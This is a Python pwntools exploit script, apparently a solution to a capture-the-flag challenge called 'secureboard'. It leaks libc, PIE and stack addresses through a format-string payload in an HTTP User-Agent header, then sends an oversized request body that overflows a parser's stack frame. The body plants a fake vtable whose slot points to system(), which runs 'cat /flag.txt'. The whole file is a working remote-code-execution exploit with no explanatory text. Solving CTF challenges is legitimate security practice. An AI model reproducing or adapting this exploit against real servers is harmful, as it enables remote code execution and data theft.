#!/usr/bin/env python3
from pwn import *
import re

context.binary = ELF('./secureboard', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'info'

HOST = args.HOST or 'careening.ctf.ritsec.club'
PORT = int(args.PORT or 1501)


def leak_addrs():
    io = remote(HOST, PORT)
    req = (
        b"GET /msg/0 HTTP/1.1\r\n"
        b"Host: x\r\n"
        b"User-Agent: %1$p|%2$p|%3$p|%4$p\r\n"
        b"X-Debug: 1\r\n"
        b"\r\n"
    )
    io.send(req)
    data = io.recvrepeat(1)
    io.close()

    m = re.search(rb"X-Debug-Info: ([^\r\n]+)", data)
    if not m:
        log.failure(f"leak failed: {data!r}")
        raise SystemExit(1)

    atoll_leak, pie_ret, arena_leak, stack_leak = [int(x, 16) for x in m.group(1).decode().split('|')]
    return atoll_leak, pie_ret, arena_leak, stack_leak


def exploit():
    atoll_leak, pie_ret, arena_leak, stack_leak = leak_addrs()
    log.info(f"atoll leak : {hex(atoll_leak)}")
    log.info(f"pie ret    : {hex(pie_ret)}")
    log.info(f"arena leak : {hex(arena_leak)}")
    log.info(f"stack leak : {hex(stack_leak)}")

    pie_base = pie_ret - 0x1674F
    libc_base = atoll_leak - libc.sym['atoll']
    system = libc_base + libc.sym['system']

    # callback pointer used later in parser
    cb = pie_base + 0x15E70
    # parser stack frame base where overflow lands
    buf = stack_leak - 0x2C28

    log.info(f"PIE base   : {hex(pie_base)}")
    log.info(f"libc base  : {hex(libc_base)}")
    log.info(f"system     : {hex(system)}")
    log.info(f"fake buf   : {hex(buf)}")

    body = bytearray(b'A' * 0x260)

    def w64(off, val):
        body[off:off + 8] = p64(val)

    # fake state @ buf
    w64(0x00, buf + 0x40)   # entries ptr
    w64(0x08, 0x1000)       # size

    # fake entry at buf+0x40
    w64(0x80, buf + 0x180)  # arg for virtual method (-> system arg)
    w64(0x88, buf + 0xC0)   # vtable ptr

    # fake vtable slot +0x18 = system
    w64(0xD8, system)

    cmd = b'cat /flag.txt\x00'
    body[0x180:0x180 + len(cmd)] = cmd

    # overwrite parser's saved callback + context
    w64(0x210, cb)
    w64(0x218, buf)

    req = (
        b"GET /msg/0 HTTP/1.1\r\n"
        b"Host: x\r\n"
        + f"Content-Length: {len(body)}\r\n".encode()
        + b"\r\n"
        + bytes(body)
    )

    io = remote(HOST, PORT)
    io.send(req)
    out = io.recvrepeat(2)
    io.close()

    print(out.decode('latin-1', 'ignore'))

    m = re.search(rb'(RS\{[^}\n]+\}|ritsec\{[^}\n]+\}|flag\{[^}\n]+\})', out, re.I)
    if m:
        print(f"\n<FLAG>{m.group(1).decode()}</FLAG>")


if __name__ == '__main__':
    exploit()
